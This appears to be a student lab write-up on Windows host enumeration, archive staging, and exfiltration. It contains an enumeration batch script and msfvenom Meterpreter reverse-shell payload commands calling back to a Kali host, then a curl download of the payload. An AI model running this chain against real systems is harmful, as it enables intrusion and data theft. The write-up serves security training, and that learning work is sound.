# Data Staging and Exfiltration

Enumeration is the phase where an attacker maps out a compromised host. Before exfiltrating data, you need to know what is on the target: running processes, network connections, user accounts, group memberships, firewall rules, and system configuration. This information tells you what data is worth stealing and how to move laterally or how to enumerate privileges. Exfiltration is the unauthorized transfer of data from a target network to an attacker-controlled system. Once you have collected and staged data, you need to move it off the target without triggering alerts. Before exfiltration, attackers compress collected files to reduce transfer size and bundle multiple files into a single archive. Password-protected archives add a layer of protection: even if intercepted, the archive contents remain encrypted.

## Task 1: Enumeration and Compression

### Enumeration
In this section we're going to use LOLBins (See Week3 for more info) to enumerate the host. We're going to run the enumeration commands in a way that saves the output of each command to a separate file. We'll redirect output to files in "C:\temp\". Save all the commands to a script (.bat or Powershell, your choice).

To make things simple we're just going to do this in one script:
```
@echo off
if not exist C:\temp mkdir C:\temp
whoami /all > C:\temp\whoami.txt
tasklist /v > C:\temp\processes.txt
netstat -ano > C:\temp\netstat.txt
sc query > C:\temp\services.txt
net user > C:\temp\users.txt
net localgroup > C:\temp\groups.txt
net localgroup administrators > C:\temp\admins.txt
ipconfig /all > C:\temp\ipconfig.txt
netsh advfirewall show allprofiles > C:\temp\firewall.txt
arp -a > C:\temp\arp.txt
:: net session is what we want here but requires admin rights, using net use instead
net use > C:\temp\smbsessions.txt
systeminfo > C:\temp\systeminfo.txt
echo Done.
```
The output file can be viewed here: [Enumeration Output Files](./EnumOutput/)

Five additional LOLBins for enumeration are seen below. Each one will include:
- The command and its flags
- What information it gathers
- Why an attacker would want that information

1.



2.

3.

4.

5.

### Compression

Using 7zip:

Note I had to add 7z to path using:
<img width="391" height="26" alt="image" src="https://github.com/user-attachments/assets/c5c436c0-e193-4d20-9437-45cdecc3eebd" />

<img width="486" height="565" alt="image" src="https://github.com/user-attachments/assets/59c0b35c-3126-4012-960e-6bab66df3094" />

Using tar:

<img width="475" height="549" alt="image" src="https://github.com/user-attachments/assets/d1a58427-ca9e-4671-9f49-48eedae4f7ef" />

Using Compress-Archive:

<img width="622" height="397" alt="image" src="https://github.com/user-attachments/assets/cecb9bff-0c1f-4213-9f04-c1491e161394" />

Using makecab:

With makecab we first need to make a directive file:
- Make a file in the temp dir called files.ddf, then fill it with the below data:
```
.OPTION EXPLICIT
.Set CabinetNameTemplate=enum_cab.cab
.Set DiskDirectory1=C:\temp
C:\temp\admins.txt
C:\temp\arp.txt
C:\temp\firewall.txt
C:\temp\groups.txt
C:\temp\ipconfig.txt
C:\temp\netstat.txt
C:\temp\processes.txt
C:\temp\services.txt
C:\temp\smbsessions.txt
C:\temp\systeminfo.txt
C:\temp\users.txt
C:\temp\whoami.txt
```


<img width="473" height="554" alt="image" src="https://github.com/user-attachments/assets/61856dc1-3a47-4283-88bd-07389df37dd0" />

## Task 2: Exfiltration via Meterpreter C2
On our kali machine create the payload and listener: ```msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.92.136 LPORT=5555 -f exe -o exfil.exe```
Start server: ```python3 -m http.server 8000```

On Windows download the payload and open it: ```curl.exe http://192.169.92.136:8000/exfil.exe -o C:\temp\exfil.exe```

<img width="1140" height="462" alt="image" src="https://github.com/user-attachments/assets/44fe1b36-557d-4c8c-934e-8b6cc524076b" />

<img width="483" height="229" alt="image" src="https://github.com/user-attachments/assets/9d8837cf-9ad2-4bda-91e2-66b806bd9be8" />

Now from our kali machine, in the meterpreter session, download the archives.

Tip for troubleshooting: I had spawned a shell in my meterpreter instance to prove I had created a reverse connection to the Windows VM. I had to drop out of that shell to download the files.

<img width="735" height="294" alt="image" src="https://github.com/user-attachments/assets/412449d3-472d-445c-8e27-cbfb97106bba" />

<img width="424" height="82" alt="image" src="https://github.com/user-attachments/assets/b6220f0f-acdb-4a66-8260-038a980c3719" />
